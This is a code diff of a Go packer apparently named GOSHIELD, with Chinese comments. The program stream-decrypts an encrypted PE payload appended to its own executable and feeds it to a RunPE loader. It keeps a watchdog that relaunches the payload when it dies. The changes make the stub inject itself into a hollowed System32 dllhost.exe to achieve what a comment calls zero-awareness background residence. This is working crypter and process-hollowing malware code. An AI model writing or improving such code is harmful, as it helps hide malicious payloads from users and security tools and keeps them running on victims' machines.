@@ -2,7 +2,7 @@
 package main
 
 import (
-	"bytes" // 🌟 新增：用于流式解密时的内存缓冲
+	"bytes"
 	"crypto/sha256"
 	"encoding/binary"
 	"encoding/hex"
@@ -309,27 +309,20 @@ func extractAndDecrypt(exePath string) ([]byte, error) {
 		}
 	}
 
-	// 🌟 核心流式架构改造开始 🌟
-
-	// 1. 计算出密文区段在文件中的确切起点
+	// 计算出密文区段在文件中的确切起点
 	payloadStartOffset := fileSize - footerSize - int64(payloadSize)
 	
-	// 2. 创建基于物理文件的区间读取器 (SectionReader)
-	// 这样可以彻底避免将加密的 Payload 直接读入内存
+	// 创建基于物理文件的区间读取器
 	sectionReader := io.NewSectionReader(file, payloadStartOffset, int64(payloadSize))
 
-	// 3. 预分配解密结果缓冲区
-	// 因为流式加密结构加入了 Nonce 和 长度头，最终解密的明文会略小于 payloadSize
-	// 我们一次性 Grow 申请好空间，避免 bytes.Buffer 在追加数据时反复动态扩容造成的性能损耗
+	// 预分配解密结果缓冲区
 	var outBuf bytes.Buffer
 	outBuf.Grow(int(payloadSize))
 
-	// 4. 将区间读取器直接怼入我们重构好的流式解密引擎
 	if err := crypto.DecryptStream(sectionReader, &outBuf, realKey); err != nil {
 		return nil, fmt.Errorf("流式解密引擎处理失败: %v", err)
 	}
 
-	// 5. 将纯净的明文 PE 字节码交还给 RunPE 加载引擎
 	return outBuf.Bytes(), nil
 }
 
@@ -357,7 +350,6 @@ func main() {
 		targetPID, _ := strconv.Atoi(shadowPIDStr)
 		const accessRight = 0x00100000 | 0x0400 // SYNCHRONIZE | QUERY_INFORMATION
 
-		// 保留之前修复的：业务崩溃追踪变量
 		var crashCount int
 		var lastLaunchTime = time.Now()
 
@@ -370,7 +362,6 @@ func main() {
 				time.Sleep(500 * time.Millisecond)
 			}
 
-			// 保留之前修复的：死亡频次阈值检测，防止黑洞效应
 			if time.Since(lastLaunchTime) < 3*time.Second {
 				crashCount++
 			} else {
@@ -423,19 +414,46 @@ func main() {
 		os.Exit(1)
 	}
 
-	myExeBytes, err := os.ReadFile(exePath)
+	// 🌟 修复二：幽灵保镖内存膨胀截断优化
+	// 仅提取外壳本体，剔除后方附带的巨型加密 Payload 数据，避免保镖进程造成严重内存浪费
+	file, err := os.Open(exePath)
 	if err == nil {
-		os.Setenv("GOSHIELD_SHADOW_PID", strconv.Itoa(int(payloadPID)))
-		os.Setenv("GOSHIELD_ORIGINAL_EXE", exePath)
+		stat, _ := file.Stat()
+		fileSize := stat.Size()
+		footerSize := int64(113)
+		var stubBytes []byte
 
-		// 保留之前修复的：WINDIR 环境变量兜底
-		winDir := os.Getenv("WINDIR")
-		if winDir == "" {
-			winDir = "C:\\Windows"
+		if fileSize >= footerSize {
+			file.Seek(-footerSize, io.SeekEnd)
+			footer := make([]byte, footerSize)
+			if _, err := io.ReadFull(file, footer); err == nil {
+				if string(footer[105:113]) == "GOSHIELD" {
+					payloadSize := binary.LittleEndian.Uint64(footer[97:105])
+					payloadStartOffset := fileSize - footerSize - int64(payloadSize)
+					if payloadStartOffset > 0 {
+						// 精确分配切片，仅读取头部 Stub 外壳数据
+						stubBytes = make([]byte, payloadStartOffset)
+						file.Seek(0, io.SeekStart)
+						io.ReadFull(file, stubBytes)
+					}
+				}
+			}
 		}
-		sysDir := winDir + "\\System32\\dllhost.exe"
+		file.Close()
 
-		loader.ExecuteAsync(sysDir, myExeBytes)
+		if len(stubBytes) > 0 {
+			os.Setenv("GOSHIELD_SHADOW_PID", strconv.Itoa(int(payloadPID)))
+			os.Setenv("GOSHIELD_ORIGINAL_EXE", exePath)
+
+			winDir := os.Getenv("WINDIR")
+			if winDir == "" {
+				winDir = "C:\\Windows"
+			}
+			sysDir := winDir + "\\System32\\dllhost.exe"
+
+			// 注入纯净的轻量级外壳，实现零感知后台驻留
+			loader.ExecuteAsync(sysDir, stubBytes)
+		}
 	}
 
 	os.Exit(0)
